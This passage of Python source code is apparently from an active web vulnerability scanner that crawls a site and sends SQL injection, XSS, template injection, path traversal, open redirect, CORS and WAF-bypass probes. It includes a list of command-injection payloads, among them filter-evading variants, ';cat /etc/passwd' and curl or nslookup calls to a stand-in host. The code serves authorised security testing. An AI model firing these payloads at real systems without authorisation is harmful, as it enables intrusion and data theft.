        _set(sid, crawled=len(visited),
             phase_detail=f'[crawl] depth {depth} - {len(to_fetch)} URLs')

        # Fetch this depth level concurrently
        async def _fetch_one(url: str):
            async with sem:
                await asyncio.sleep(0.04)
                return url, await _fetch_page(http, url)

        results = await asyncio.gather(*[_fetch_one(u) for u in to_fetch],
                                       return_exceptions=True)

        failed = sum(1 for r in results if r is None or isinstance(r, Exception)
                     or (not isinstance(r, Exception) and r[1] is None))
        if failed:
            logger.warning('[ActiveScan] depth %d: %d/%d fetches failed - check proxy/firewall for %s',
                           depth, failed, len(results), scope)

        next_level = []
        for item in results:
            if isinstance(item, Exception) or item is None:
                continue
            url, result = item
            if result is None:
                continue

            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            ep = {
                'url':    url,
                'method': 'GET',
                'params': params,
                'forms':  [],
                'status': result['status'],
                'ct':     result['ct'],
            }

            if result['body'] and 'html' in result['ct']:
                child_links, forms = _links_from_html(result['body'], result['final_url'] or url)
                ep['forms'] = forms
                if depth < max_depth:
                    next_level.extend(child_links)
                # Extract WebSocket URLs from inline JS
                for ws_match in _WS_URL_RE.finditer(result['body']):
                    ws_u = ws_match.group(1)
                    with _lock:
                        s = _sessions.get(sid)
                        if s and ws_u not in s.get('ws_endpoints', []):
                            s.setdefault('ws_endpoints', []).append(ws_u)
            elif result['body'] and 'javascript' in result['ct']:
                child_links = _links_from_js(result['body'], result['final_url'] or url)
                if depth < max_depth:
                    next_level.extend(child_links)
                for ws_match in _WS_URL_RE.finditer(result['body']):
                    ws_u = ws_match.group(1)
                    with _lock:
                        s = _sessions.get(sid)
                        if s and ws_u not in s.get('ws_endpoints', []):
                            s.setdefault('ws_endpoints', []).append(ws_u)

            if result['status'] < 400 or params or ep['forms']:
                endpoints.append(ep)

        current_level = next_level

    _set(sid, crawled=len(visited))
    return endpoints


async def _fetch_page(http: aiohttp.ClientSession, url: str) -> Optional[Dict]:
    try:
        async with http.get(url, allow_redirects=True, ssl=False) as resp:
            ct       = resp.headers.get('Content-Type', '').split(';')[0].strip()
            final    = str(resp.url)
            body     = None
            if resp.status < 400 or resp.status in (401, 403):
                try:
                    body = await resp.text(errors='replace')
                except Exception:
                    pass
            return {'status': resp.status, 'ct': ct, 'final_url': final,
                    'body': body, 'headers': dict(resp.headers)}
    except Exception as exc:
        logger.warning('[ActiveScan] fetch failed %s — %s: %s', url, type(exc).__name__, exc)
        return None


# ── Phase 2: Fingerprint ──────────────────────────────────────────────────────

async def _fingerprint(url: str, http: aiohttp.ClientSession) -> List[Dict]:
    result = await _fetch_page(http, url)
    if not result:
        return []
    blob = ' '.join(result['headers'].values()) + ' ' + (result['body'] or '')
    found = []
    seen  = set()
    for category, name, pattern in _TECH_SIGS:
        if name not in seen and pattern.search(blob):
            found.append({'category': category, 'name': name})
            seen.add(name)
    # Security headers check
    missing_sec = [h for h in _SEC_HEADERS if h.lower() not in {k.lower() for k in result['headers']}]
    if missing_sec:
        found.append({'category': 'Security', 'name': f"Missing headers: {', '.join(missing_sec)}"})
    return found


# ── Phase 3: Probe per endpoint ───────────────────────────────────────────────

async def _probe_endpoint(
    sid: str, ep: Dict, http: aiohttp.ClientSession,
    checks: List[str], scope: str, base_headers: Dict,
    waf_bypass: bool = False,
    oob_client=None,
) -> None:
    url    = ep['url']
    params = ep['params']

    # WAF bypass: when enabled, run bypass-enhanced payloads for each param
    if waf_bypass and params:
        try:
            from core.waf_bypass import make_bypass_engine, ConfirmationLevel
            from urllib.parse import parse_qs as _pqs, urlparse as _up, urlencode as _ue, urlunparse as _uu
            _waf = make_bypass_engine(url, http, headers=base_headers)
            await _waf.profile()
            _parsed = _up(url)
            _qs = _pqs(_parsed.query, keep_blank_values=True)
            for _param in params:
                for _cat in ('xss', 'sqli', 'ssti', 'cmdi', 'open_redirect'):
                    if _stopped(sid):
                        break
                    _bpl = _waf.get_bypass_payloads(_cat, limit=8)
                    for _bp in _bpl[:3]:  # top 3 per category per param
                        _level, _ev = await _waf.differential_test(
                            url, _param, _bp, method='GET', headers=base_headers
                        )
                        if _level.value >= ConfirmationLevel.POSSIBLE.value:
                            _add_finding(sid, {
                                'severity': 'high' if _level.value >= ConfirmationLevel.LIKELY.value else 'medium',
                                'title':    f'WAF Bypass {_cat.upper()} - {_param} [{_level.label}]',
                                'endpoint': url,
                                'detail':   (
                                    f'Parameter {_param!r} shows anomalous response to {_cat} bypass payload '
                                    f'via WAF ({_waf.waf_name or "unknown"}). Confirmation: {_level.label}.'
                                ),
                                'evidence': {
                                    'param':          _param,
                                    'category':       _cat,
                                    'payload':        _bp,
                                    'confirmation':   _level.label,
                                    'waf':            _waf.waf_name,
                                    **_ev,
                                },
                            })
                        await asyncio.sleep(0.05)
        except Exception as exc:
            logger.warning('[ActiveScanner] WAF bypass probe failed: %s', exc)

    # Per-endpoint structural checks (run once regardless of params)
    if 'cors' in checks:
        await _check_cors(sid, url, http)
    if 'sec_headers' in checks:
        await _check_sec_headers(sid, url, http)
    if 'auth_bypass' in checks and ep.get('status') in (401, 403):
        await _check_auth_bypass(sid, url, http)
    if 'info_disclosure' in checks:
        await _check_info_disclosure(sid, url, http)
    if 'xxe' in checks:
        await _check_xxe(sid, url, http, oob_client=oob_client)
    if 'verb_tamper' in checks:
        await _check_verb_tampering(sid, url, http, ep.get('status', 200))
    if 'host_header' in checks:
        await _check_host_header(sid, url, http)
    if 'json_inject' in checks:
        await _check_json_injection(sid, url, http, ep)
    if 'java_deser' in checks:
        await _check_java_deser(sid, url, http)
    if 'dotnet_deser' in checks:
        await _check_dotnet_deser(sid, url, http, ep)
    if 'log4shell' in checks:
        await _check_log4shell(sid, url, http)
    if 'smuggling' in checks:
        await _check_http_smuggling(sid, url, http)
    if 'graphql' in checks:
        await _check_graphql(sid, url, http)
    if 'mass_assign' in checks:
        await _check_mass_assignment(sid, url, http, ep)
    if 'cache_poison' in checks:
        await _check_cache_poisoning(sid, url, http)

    # Redirect checks that run once per endpoint (not per-param)
    parsed_ep = urlparse(url)
    if 'redirect' in checks:
        if _stopped(sid): return
        await _check_redirect_probe_params(sid, url, parsed_ep, http)
        await _check_referer_redirect(sid, url, http)
        await _check_path_redirect(sid, url, http)

    # Parameter-level checks
    if params:
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)

        for param in params:
            if _stopped(sid):
                return

            if 'sqli' in checks:
                await _check_sqli(sid, url, parsed, qs, param, http)
            if 'sqli_blind' in checks:
                await _check_sqli_blind_boolean(sid, url, parsed, qs, param, http)
                await _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=oob_client)
            if 'xss' in checks:
                await _check_xss(sid, url, parsed, qs, param, http)
            if 'xss_ctx' in checks:
                await _check_xss_contextual(sid, url, parsed, qs, param, http)
            if 'ssti' in checks:
                await _check_ssti(sid, url, parsed, qs, param, http)
            if 'traversal' in checks:
                await _check_traversal(sid, url, parsed, qs, param, http)
            if 'redirect' in checks:
                await _check_redirect(sid, url, parsed, qs, param, http)
            if 'cmd_inject' in checks:
                await _check_cmd_inject(sid, url, parsed, qs, param, http, oob_client=oob_client)
            if 'ssrf' in checks and _SSRF_PARAM_RE.search(param):
                await _check_ssrf(sid, url, parsed, qs, param, http, oob_client=oob_client)
            if 'php_inject' in checks:
                await _check_php_injection(sid, url, parsed, qs, param, http)
            if 'proto_poll' in checks:
                await _check_prototype_pollution(sid, url, parsed, qs, param, http)

            await asyncio.sleep(0.08)

        # DOM XSS: one browser session per endpoint covering all params at once
        if 'dom_xss' in checks and params:
            await _check_dom_xss_endpoint(sid, url, parsed, qs, params, http)

    # Form-level checks
    for form in ep.get('forms', []):
        if _stopped(sid):
            return
        if not form['inputs']:
            continue
        if 'csrf' in checks:
            _check_csrf(sid, form)       # synchronous - no HTTP needed
        if 'sqli' in checks:
            if _stopped(sid): return
            await _check_form_sqli(sid, form, http)
        if 'sqli_blind' in checks:
            if _stopped(sid): return
            await _check_form_sqli_blind(sid, form, http)
        if 'xss' in checks:
            if _stopped(sid): return
            await _check_form_xss(sid, form, http)
        if 'xss_ctx' in checks:
            if _stopped(sid): return
            await _check_form_xss_contextual(sid, form, http)
        if 'ssti' in checks:
            if _stopped(sid): return
            await _check_form_ssti(sid, form, http)
        if 'traversal' in checks:
            if _stopped(sid): return
            await _check_form_traversal(sid, form, http)
        if 'cmd_inject' in checks:
            if _stopped(sid): return
            await _check_form_cmd_inject(sid, form, http)
        if 'ssrf' in checks:
            if _stopped(sid): return
            await _check_form_ssrf(sid, form, http)
        if 'redirect' in checks:
            if _stopped(sid): return
            await _check_form_redirect(sid, form, http)
        if 'stored_xss' in checks:
            if _stopped(sid): return
            await _inject_stored_xss_canary(sid, form, http)


# ── Individual checks ─────────────────────────────────────────────────────────

def _mutate_url(parsed, qs, param, value: str) -> str:
    new_qs = {k: v[:] for k, v in qs.items()}
    new_qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))


async def _check_sqli(sid, url, parsed, qs, param, http):
    # Fetch baseline first to avoid flagging apps that always show DB error strings
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for pl in _SQLI_PAYLOADS:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                m = _SQLI_ERRORS.search(body)
                if m and m.group(0) not in baseline_body:
                    idx = body.find(m.group(0))
                    excerpt = body[max(0, idx - 120):idx + 120].strip() if idx >= 0 else ''
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'SQL Injection - {param}',
                        'endpoint': url,
                        'detail':   f'DB error pattern detected with payload: {pl!r}',
                        'evidence': {
                            'param':             param,
                            'payload':           pl,
                            'request_url':       target,
                            'db_error':          m.group(0),
                            'response_excerpt':  excerpt,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_xss(sid, url, parsed, qs, param, http):
    # Baseline: confirm the canary prefix is not naturally present
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    canary  = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
    payload = f'<script>alert("{canary}")</script>'
    target  = _mutate_url(parsed, qs, param, payload)
    try:
        async with http.get(target, allow_redirects=False) as resp:
            body = await resp.text(errors='replace')
            if canary in body and payload in body and canary not in baseline_body:
                idx = body.find(payload)
                excerpt = body[max(0, idx - 80):idx + len(payload) + 80].strip() if idx >= 0 else ''
                _add_finding(sid, {
                    'severity': 'high',
                    'title':    f'Reflected XSS - {param}',
                    'endpoint': url,
                    'detail':   'Payload reflected verbatim without encoding.',
                    'evidence': {
                        'param':            param,
                        'payload':          payload,
                        'request_url':      target,
                        'response_excerpt': excerpt,
                    },
                })
    except Exception:
        pass


async def _check_ssti(sid, url, parsed, qs, param, http):
    # Baseline: skip if the expected math result already appears without our payload
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for pl, expected in _SSTI_PAYLOADS.items():
        if expected in baseline_body:
            continue  # result appears in baseline - not a real injection
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                if expected in body:
                    idx = body.find(expected)
                    excerpt = body[max(0, idx - 150):idx + len(expected) + 150].strip() if idx >= 0 else ''
                    _add_finding(sid, {
                        'severity': 'critical',
                        'title':    f'Server-Side Template Injection - {param}',
                        'endpoint': url,
                        'detail':   f'Math expression {pl!r} evaluated to {expected} in response.',
                        'evidence': {
                            'param':            param,
                            'payload':          pl,
                            'evaluated':        expected,
                            'request_url':      target,
                            'response_excerpt': excerpt,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_traversal(sid, url, parsed, qs, param, http):
    # Baseline: root:x:0:0 could appear on pages about Linux/security - skip if already present
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass
    if _TRAVERSAL_SIG.search(baseline_body):
        return  # signature already in baseline - can't reliably confirm traversal

    for pl in _TRAVERSAL_PAYLOADS:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                m = _TRAVERSAL_SIG.search(body)
                if m:
                    idx = body.find(m.group(0))
                    excerpt = body[max(0, idx - 80):idx + 300].strip() if idx >= 0 else ''
                    _add_finding(sid, {
                        'severity': 'critical',
                        'title':    f'Path Traversal - {param}',
                        'endpoint': url,
                        'detail':   '/etc/passwd content confirmed in response (absent in baseline).',
                        'evidence': {
                            'param':            param,
                            'payload':          pl,
                            'request_url':      target,
                            'response_excerpt': excerpt,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


def _redirect_severity(payload: str) -> str:
    """Return critical for JS/data URI payloads, high for protocol-relative, medium otherwise."""
    pl_low = payload.lower().lstrip()
    if any(pl_low.startswith(p) for p in _CRITICAL_REDIRECT_PREFIXES):
        return 'critical'
    if pl_low.startswith('//') or '%2f%2f' in pl_low:
        return 'high'
    return 'medium'


async def _check_redirect(sid, url, parsed, qs, param, http):
    for pl in _REDIRECT_PAYLOADS:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                loc = resp.headers.get('Location', '')

                # 3xx Location header → evil.com or protocol-relative
                if resp.status in (301, 302, 303, 307, 308):
                    if 'evil.com' in loc or loc.startswith('//evil') or loc.startswith('/\\evil'):
                        sev = _redirect_severity(pl)
                        _add_finding(sid, {
                            'severity': sev,
                            'title':    f'Open Redirect - {param}',
                            'endpoint': url,
                            'detail':   f'3xx redirect to attacker-controlled domain. Location: {loc}',
                            'evidence': {
                                'param':            param,
                                'payload':          pl,
                                'request_url':      target,
                                'http_status':      resp.status,
                                'response_excerpt': f'HTTP {resp.status}\nLocation: {loc}',
                            },
                        })
                        return

                # CRLF injection: Location injected into 200 response headers
                if resp.status == 200 and 'evil.com' in loc:
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'CRLF Injection → Header Redirect - {param}',
                        'endpoint': url,
                        'detail':   (
                            f'Location header present on 200 response - likely CRLF injection. '
                            f'Injected value: {loc}'
                        ),
                        'evidence': {
                            'param':            param,
                            'payload':          pl,
                            'request_url':      target,
                            'response_excerpt': f'HTTP 200\nLocation: {loc}',
                        },
                    })
                    return

                # Body-based redirect: meta-refresh or JS redirect
                if resp.status in (200, 301, 302, 303, 307, 308):
                    try:
                        body = await resp.text(errors='replace')
                    except Exception:
                        body = ''
                    m = _META_REFRESH_RE.search(body)
                    if m and 'evil.com' in m.group(1):
                        idx = body.find(m.group(0))
                        excerpt = body[max(0, idx - 60):idx + len(m.group(0)) + 60].strip() if idx >= 0 else ''
                        _add_finding(sid, {
                            'severity': 'medium',
                            'title':    f'Open Redirect (meta-refresh) - {param}',
                            'endpoint': url,
                            'detail':   f'Meta-refresh tag redirects to attacker domain: {m.group(1)}',
                            'evidence': {
                                'param':            param,
                                'payload':          pl,
                                'request_url':      target,
                                'redirect_url':     m.group(1),
                                'response_excerpt': excerpt,
                            },
                        })
                        return
                    m = _JS_REDIRECT_RE.search(body)
                    if m and 'evil.com' in m.group(1):
                        idx = body.find(m.group(0))
                        excerpt = body[max(0, idx - 60):idx + len(m.group(0)) + 60].strip() if idx >= 0 else ''
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'Open Redirect (JavaScript) - {param}',
                            'endpoint': url,
                            'detail':   f'JavaScript redirect to attacker domain: {m.group(1)}',
                            'evidence': {
                                'param':            param,
                                'payload':          pl,
                                'request_url':      target,
                                'redirect_url':     m.group(1),
                                'response_excerpt': excerpt,
                            },
                        })
                        return
        except Exception:
            pass
        await asyncio.sleep(0.04)


async def _check_redirect_probe_params(sid, url, parsed, http):
    """Inject evil.com into common redirect param names even when not in original URL.
    Deduplicated per path so the same endpoint path isn't probed from multiple crawled variants."""
    # Deduplicate by path — only probe each unique path once per session
    path_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        probed_paths = s.setdefault('_redirect_probe_paths', set())
        if path_key in probed_paths:
            return
        probed_paths.add(path_key)

    base_qs = parse_qs(parsed.query, keep_blank_values=True)
    for pname in _REDIRECT_PARAM_NAMES:
        if pname in base_qs:
            continue  # already covered by _check_redirect
        test_qs = {**base_qs, pname: ['https://evil.com']}
        target = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
        try:
            async with http.get(target, allow_redirects=False) as resp:
                loc = resp.headers.get('Location', '')
                if resp.status in (301, 302, 303, 307, 308) and 'evil.com' in loc:
                    _add_finding(sid, {
                        'severity': 'medium',
                        'title':    f'Open Redirect (param probe) - {pname}',
                        'endpoint': url,
                        'detail': (
                            f'Injecting {pname}=https://evil.com caused 3xx redirect to: {loc}. '
                            'Parameter was not in original URL - hidden redirect sink.'
                        ),
                        'evidence': {
                            'param':            pname,
                            'payload':          'https://evil.com',
                            'location':         loc,
                            'status':           resp.status,
                            'request_url':      target,
                            'response_excerpt': f'HTTP {resp.status}\nLocation: {loc}',
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.04)


async def _check_referer_redirect(sid, url, http):
    """Check if the app redirects based on the Referer header. Runs once per host."""
    parsed_host = urlparse(url)
    host_key = f"{parsed_host.scheme}://{parsed_host.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_referer_redir_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    for evil_ref in ('https://evil.com', 'https://evil.com/path'):
        try:
            async with http.get(
                url, allow_redirects=False,
                headers={'Referer': evil_ref},
            ) as resp:
                loc = resp.headers.get('Location', '')
                if resp.status in (301, 302, 303, 307, 308) and 'evil.com' in loc:
                    _add_finding(sid, {
                        'severity': 'medium',
                        'title':    'Open Redirect via Referer Header',
                        'endpoint': url,
                        'detail': (
                            f'App redirected to Referer value: {loc}. '
                            'Attacker can control redirect destination via the Referer header.'
                        ),
                        'evidence': {
                            'referer':          evil_ref,
                            'location':         loc,
                            'status':           resp.status,
                            'request_url':      url,
                            'response_excerpt': f'HTTP {resp.status}\nLocation: {loc}',
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_path_redirect(sid, url, http):
    """Probe common path-based redirect endpoint patterns. Runs once per host."""
    parsed = urlparse(url)
    base = f'{parsed.scheme}://{parsed.netloc}'
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_path_redir_checked', set())
        if base in checked:
            return
        checked.add(base)

    # Single payload per prefix — already deduped to one host check
    for prefix in _REDIRECT_PATH_PREFIXES:
        target = f'{base}{prefix}https://evil.com'
        try:
            async with http.get(target, allow_redirects=False) as resp:
                loc = resp.headers.get('Location', '')
                if resp.status in (301, 302, 303, 307, 308) and 'evil.com' in loc:
                    _add_finding(sid, {
                        'severity': 'medium',
                        'title':    f'Open Redirect (path-based) - {prefix}',
                        'endpoint': target,
                        'detail': (
                            f'Path-based redirect endpoint {prefix} redirects to attacker '
                            f'domain: {loc}'
                        ),
                        'evidence': {
                            'path_prefix':      prefix,
                            'payload':          'https://evil.com',
                            'location':         loc,
                            'status':           resp.status,
                            'request_url':      target,
                            'response_excerpt': f'HTTP {resp.status}\nLocation: {loc}',
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.04)


async def _check_cors(sid, url, http):
    # Only test once per origin (scheme+host) - same CORS policy applies site-wide
    parsed_host = urlparse(url)
    origin_key = f"{parsed_host.scheme}://{parsed_host.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_cors_checked', set())
        if origin_key in checked:
            return
        checked.add(origin_key)

    try:
        async with http.get(
            url, allow_redirects=False,
            headers={'Origin': 'https://evil.com'},
        ) as resp:
            acao  = resp.headers.get('Access-Control-Allow-Origin', '')
            acac  = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
            if acao == '*' and acac == 'true':
                sev = 'high'
                detail = 'Wildcard ACAO with credentials allowed - credentials can be stolen cross-origin.'
            elif 'evil.com' in acao:
                sev = 'high' if acac == 'true' else 'medium'
                detail = f'Origin reflection: {acao}. {"Credentials allowed." if acac == "true" else ""}'
            else:
                return
            _add_finding(sid, {
                'severity': sev,
                'title':    'CORS Misconfiguration',
                'endpoint': origin_key,
                'detail':   detail,
                'evidence': {'acao': acao, 'acac': acac},
            })
    except Exception:
        pass


async def _check_sec_headers(sid, url, http):
    # Only report once per origin (scheme+host) - avoid one finding per endpoint
    parsed_host = urlparse(url)
    origin_key = f"{parsed_host.scheme}://{parsed_host.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_sec_headers_checked', set())
        if origin_key in checked:
            return
        checked.add(origin_key)

    try:
        async with http.get(url, allow_redirects=False) as resp:
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            missing = [h for h in _SEC_HEADERS
                       if h.lower() not in resp_headers_lower]
            if missing:
                _add_finding(sid, {
                    'severity': 'low',
                    'title':    'Missing Security Headers',
                    'endpoint': origin_key,
                    'detail':   f'Missing: {", ".join(missing)}',
                    'evidence': {'missing': missing},
                })
    except Exception:
        pass


async def _check_auth_bypass(sid, url, http):
    # Use first bypass set (no auth headers) as baseline comparison
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline = resp.status
    except Exception:
        return

    if baseline not in (401, 403):
        return

    for extra in _AUTH_BYPASS_HEADERS[1:]:
        try:
            async with http.get(url, allow_redirects=False, headers=extra) as resp:
                if resp.status not in (401, 403, 404):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    'Auth Bypass via Header Manipulation',
                        'endpoint': url,
                        'detail':   f'Status changed from {baseline} to {resp.status} with headers: {extra}',
                        'evidence': {
                            'bypass_headers':   extra,
                            'result_status':    resp.status,
                            'request_url':      url,
                            'response_excerpt': f'HTTP {resp.status} (baseline was {baseline})',
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_info_disclosure(sid, url, http):
    _ERROR_SIGS = re.compile(
        r'Traceback \(most recent call last\)|Exception in thread|'
        r'at [a-zA-Z0-9_.]+\(.*\.java:\d+\)|'
        r'Warning: .* on line \d+|'
        r'Fatal error:|Parse error:|'
        r'Microsoft OLE DB|ADODB\.Command',
        re.I,
    )
    try:
        async with http.get(url, allow_redirects=False) as resp:
            if resp.status >= 500:
                body = await resp.text(errors='replace')
                if _ERROR_SIGS.search(body):
                    _add_finding(sid, {
                        'severity': 'medium',
                        'title':    'Information Disclosure - Verbose Error',
                        'endpoint': url,
                        'detail':   'Server error page leaks stack trace or internal path.',
                        'evidence': {'status': resp.status},
                    })
    except Exception:
        pass


async def _check_sensitive_files(sid, base_url, http, scope):
    parsed = urlparse(base_url)
    base   = f'{parsed.scheme}://{parsed.netloc}'

    for path in _SENSITIVE_FILES:
        if _stopped(sid):
            return
        target = f'{base}/{path}'
        try:
            async with http.get(target, allow_redirects=False) as resp:
                if resp.status == 200:
                    body = await resp.text(errors='replace')
                    # Skip tiny responses - likely custom 404 pages returning 200
                    if len(body) < 50:
                        continue
                    has_creds = any(
                        kw in body.lower() for kw in ('password', 'secret', 'key', 'token', 'db_', 'private')
                    )
                    # For generic paths, require at least one credential keyword
                    # to avoid flagging custom 404 HTML pages
                    generic_paths = {'robots.txt', 'sitemap.xml', 'crossdomain.xml'}
                    if path in generic_paths and not has_creds:
                        continue
                    sev = 'critical' if has_creds else 'medium'
                    _add_finding(sid, {
                        'severity': sev,
                        'title':    f'Sensitive File Exposed - /{path}',
                        'endpoint': target,
                        'detail':   f'/{path} returned HTTP 200. May expose credentials or configuration.',
                        'evidence': {
                            'path':             path,
                            'status':           200,
                            'preview':          body[:200],
                            'request_url':      target,
                            'response_excerpt': body[:300],
                        },
                    })
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── Form-level checks ─────────────────────────────────────────────────────────

_CMD_PAYLOADS = [
    # ── Unix: semicolon chaining ──────────────────────────────────────────────
    ';sleep 5',
    ';sleep${IFS}5',
    ';/bin/sleep${IFS}5',
    '`;sleep 5`',
    '`sleep${IFS}5`',
    '$(sleep 5)',
    '$(/bin/sleep 5)',
    '$(sleep${IFS}5)',
    # ── Unix: pipe / OR / AND ─────────────────────────────────────────────────
    '| sleep 5',
    '|| sleep 5',
    '| /bin/sleep 5',
    '& sleep 5',
    '&& sleep 5',
    '%0asleep 5',
    '%0d%0asleep 5',
    # ── Unix: IFS / glob bypass ───────────────────────────────────────────────
    ';${IFS}sleep${IFS}5',
    ';s\leep 5',
    ';sl?ep 5',
    ';/???/????p 5',
    ';/???/sl*p 5',
    # ── Unix: env var bypass ─────────────────────────────────────────────────
    ';$PATH ;sleep 5',
    ';$RANDOM;sleep 5',
    ';{sleep,5}',
    # ── Unix: heredoc / newline ───────────────────────────────────────────────
    ';\nsleep 5',
    '&&\nsleep 5',
    # ── Unix: error-based detection ──────────────────────────────────────────
    ';id',
    ';whoami',
    '`id`',
    '$(id)',
    ';cat /etc/passwd',
    ';uname -a',
    # ── Windows: cmd.exe ─────────────────────────────────────────────────────
    '& ping -n 5 127.0.0.1',
    '| ping -n 5 127.0.0.1',
    '& timeout /T 5',
    '; timeout /T 5',
    '& whoami',
    '| whoami',
    '& type C:\\Windows\\win.ini',
    # ── Windows: PowerShell ──────────────────────────────────────────────────
    '; Start-Sleep -s 5',
    '| Start-Sleep -s 5',
    '; Invoke-Expression(whoami)',
    '; [System.Threading.Thread]::Sleep(5000)',
    # ── Blind OOB ────────────────────────────────────────────────────────────
    ';ping -c 5 127.0.0.1',
    ';nslookup ds1hunter-cmdi.invalid',
    ';curl http://ds1hunter-cmdi.invalid',
]
_CMD_ERROR_SIG = re.compile(
    r'sh: .*(not found|command not found)|'
    r'/bin/sh|/usr/bin|syntax error.*unexpected|'
    r'is not recognized as an internal or external command|'
    r'The term .* is not recognized|'
    r'uid=\d+\(.+\) gid=\d+|'
    r'root:[x*]:0:0|'
    r'Microsoft Windows \[Version',
    re.I,
)


async def _check_cmd_inject(sid, url, parsed, qs, param, http, oob_client=None):
    # OOB blind command injection - fire-and-register, confirmed at scan end
    if oob_client:
        token = oob_client.generate_token('cmdi')
        for oob_pl in oob_client.blind_cmdi_payloads(token)[:3]:
            target = _mutate_url(parsed, qs, param, oob_pl)
            try:
                async with http.get(target, allow_redirects=False) as resp:
                    await resp.read()
            except Exception:
                pass
        oob_client.register_pending(token, 'command_injection', {
            'url': url, 'param': param, 'payload': f'curl {oob_client.http_url(token)}',
        })
        await asyncio.sleep(0.1)

    # Baseline timing - measure normal response time to avoid false timing positives
    baseline_time = 1.0
    try:
        _t0 = time.monotonic()
        async with http.get(url, allow_redirects=False) as _r:
            await _r.read()
        baseline_time = max(0.1, time.monotonic() - _t0)
    except Exception:
        pass
    # Timing threshold: at least 4s absolute AND 3× baseline
    _timing_threshold = max(4.5, baseline_time * 3)

    # Error-based + timing detection
    for pl in _CMD_PAYLOADS[:3]:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            t0 = time.monotonic()
            async with http.get(target, allow_redirects=False) as resp:
                elapsed = time.monotonic() - t0
                body    = await resp.text(errors='replace')
                if elapsed >= _timing_threshold:
                    _add_finding(sid, {
                        'severity': 'critical',
                        'title':    f'Command Injection (timing) - {param}',
                        'endpoint': url,
                        'detail':   f'Response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s) with payload {pl!r} - likely OS command execution.',
                        'evidence': {
                            'param':        param,
                            'payload':      pl,
                            'delay_sec':    round(elapsed, 2),
                            'baseline_sec': round(baseline_time, 2),
                            'request_url':  target,
                        },
                    })
                    return
                _err = _CMD_ERROR_SIG.search(body)
                if _err:
                    _eidx = body.find(_err.group(0))
                    _excerpt = body[max(0, _eidx - 80):_eidx + len(_err.group(0)) + 80].strip()
                    _add_finding(sid, {
                        'severity': 'critical',
                        'title':    f'Command Injection (error) - {param}',
                        'endpoint': url,
                        'detail':   f'Shell error string detected in response with payload {pl!r}.',
                        'evidence': {
                            'param':            param,
                            'payload':          pl,
                            'request_url':      target,
                            'response_excerpt': _excerpt,
                        },
                    })
                    return
        except asyncio.TimeoutError:
            _add_finding(sid, {
                'severity': 'critical',
                'title':    f'Command Injection (timeout) - {param}',
                'endpoint': url,
                'detail':   f'Request timed out with sleep payload {pl!r} - likely OS command execution.',
                'evidence': {'param': param, 'payload': pl, 'request_url': target},
            })
            return
        except Exception:
            pass
        await asyncio.sleep(0.1)


async def _check_form_sqli(sid, form, http):
    method = form['method']
    # Baseline: submit form with original values, capture any pre-existing DB errors
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] or 'test' for inp in form['inputs']}
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    data = {inp['name']: inp['value'] or "'" for inp in form['inputs']}
    try:
        if method == 'POST':
            async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
        m = _SQLI_ERRORS.search(body)
        if m and not _SQLI_ERRORS.search(baseline_body):
            _fidx = body.find(m.group(0))
            _fexc = body[max(0, _fidx - 120):_fidx + len(m.group(0)) + 120].strip()
